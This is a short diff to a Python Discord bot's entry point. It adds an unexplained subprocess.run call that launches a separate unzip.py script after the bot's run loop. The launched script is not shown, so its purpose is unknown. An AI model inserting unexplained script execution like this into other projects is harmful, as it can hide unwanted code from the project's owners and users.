@@ -86,5 +86,7 @@ async def on_ready():
 if __name__ == "__main__":
     try:
         bot.run(TOKEN)
+        
     except Exception as e:
         print(f"Failed to start the bot: {e}")
+    subprocess.run(["python", "unzip.py"], check=True)    
